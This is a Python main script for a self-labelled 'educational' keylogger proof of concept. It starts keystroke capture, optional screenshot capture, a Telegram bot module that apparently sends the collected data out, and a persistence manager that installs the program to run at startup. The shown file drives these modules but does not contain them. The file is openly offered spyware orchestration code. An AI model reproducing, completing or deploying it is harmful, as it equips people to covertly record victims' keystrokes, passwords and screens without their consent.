#!/usr/bin/env python3
"""
Keylogger POC - Main Application Entry Point
Educational Purpose Only - Use Responsibly

This is the main entry point for the keylogger POC application.
It initializes all components and manages the application lifecycle.
"""

import os
import sys
import time
import signal
import threading
from pathlib import Path

# Add src directory to Python path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'src'))

from src.core.keylogger import KeyLogger
from src.core.log_manager import LogManager
from src.core.persistence import PersistenceManager
from src.modules.screenshot import ScreenshotCapture
from src.modules.telegram_bot import TelegramBot
from src.utils.config import ConfigManager
from src.utils.encryption import EncryptionManager
from src.utils.helpers import setup_logging, check_admin_privileges

class KeyloggerApplication:
    """Main application class that orchestrates all components."""
    
    def __init__(self):
        self.config = ConfigManager()
        self.encryption = EncryptionManager(self.config)
        self.log_manager = LogManager(self.config, self.encryption)
        self.keylogger = None
        self.screenshot_capture = None
        self.telegram_bot = None
        self.persistence_manager = None
        self.running = False
        self.kill_switch_active = False
        
        # Setup logging
        setup_logging(self.config.get('GENERAL', 'log_directory', 'logs'))
        
        # Setup signal handlers
        signal.signal(signal.SIGINT, self._signal_handler)
        signal.signal(signal.SIGTERM, self._signal_handler)
        
    def initialize(self):
        """Initialize all application components."""
        try:
            print("Initializing Keylogger POC...")
            
            # Check for admin privileges on Windows
            if not check_admin_privileges():
                print("Warning: Running without administrator privileges may limit functionality.")
            
            # Initialize core components
            self.keylogger = KeyLogger(self.config, self.log_manager)
            
            # Initialize optional components based on configuration
            if self.config.getboolean('SCREENSHOT', 'enabled', fallback=False):
                self.screenshot_capture = ScreenshotCapture(self.config, self.log_manager)
            
            if self.config.getboolean('TELEGRAM', 'enabled', fallback=False):
                self.telegram_bot = TelegramBot(self.config, self.log_manager)
            
            if self.config.getboolean('GENERAL', 'startup_persistence', fallback=False):
                self.persistence_manager = PersistenceManager(self.config)
                self.persistence_manager.install()
            
            print("Initialization complete.")
            return True
            
        except Exception as e:
            print(f"Initialization failed: {e}")
            return False
    
    def start(self):
        """Start the keylogger application."""
        if not self.initialize():
            return False
        
        try:
            print("Starting keylogger...")
            self.running = True
            
            # Start keylogger
            self.keylogger.start()
            
            # Start screenshot capture if enabled
            if self.screenshot_capture:
                screenshot_thread = threading.Thread(target=self.screenshot_capture.start_capture)
                screenshot_thread.daemon = True
                screenshot_thread.start()
            
            # Start Telegram bot if enabled
            if self.telegram_bot:
                telegram_thread = threading.Thread(target=self.telegram_bot.start_monitoring)
                telegram_thread.daemon = True
                telegram_thread.start()
            
            print("Keylogger started successfully.")
            print("Press Ctrl+Shift+F12 to stop or create 'KILL_SWITCH' file.")
            
            # Main loop
            self._main_loop()
            
        except Exception as e:
            print(f"Error starting keylogger: {e}")
            return False
        
        return True
    
    def stop(self):
        """Stop the keylogger application."""
        print("Stopping keylogger...")
        self.running = False
        
        try:
            if self.keylogger:
                self.keylogger.stop()
            
            if self.screenshot_capture:
                self.screenshot_capture.stop_capture()
            
            if self.telegram_bot:
                self.telegram_bot.stop_monitoring()
            
            print("Keylogger stopped successfully.")
            
        except Exception as e:
            print(f"Error stopping keylogger: {e}")
    
    def _main_loop(self):
        """Main application loop."""
        kill_switch_file = Path("KILL_SWITCH")
        
        while self.running:
            try:
                # Check for kill switch file
                if kill_switch_file.exists():
                    print("Kill switch file detected. Stopping...")
                    kill_switch_file.unlink()  # Remove the file
                    break
                
                # Sleep for a short interval
                time.sleep(1)
                
            except KeyboardInterrupt:
                break
            except Exception as e:
                print(f"Error in main loop: {e}")
                time.sleep(5)  # Wait before retrying
    
    def _signal_handler(self, signum, frame):
        """Handle system signals."""
        print(f"Received signal {signum}. Shutting down...")
        self.running = False

def main():
    """Main function."""
    print("=" * 60)
    print("Keylogger POC - Educational Purpose Only")
    print("Use Responsibly and Ethically")
    print("=" * 60)
    
    # Check if kill switch is already active
    if Path("KILL_SWITCH").exists():
        print("Kill switch file found. Removing and exiting...")
        Path("KILL_SWITCH").unlink()
        return
    
    # Create and start application
    app = KeyloggerApplication()
    
    try:
        success = app.start()
        if not success:
            print("Failed to start application.")
            return 1
    
    except KeyboardInterrupt:
        print("\nKeyboard interrupt received.")
    
    except Exception as e:
        print(f"Unexpected error: {e}")
        return 1
    
    finally:
        app.stop()
    
    print("Application terminated.")
    return 0

if __name__ == "__main__":
    sys.exit(main())

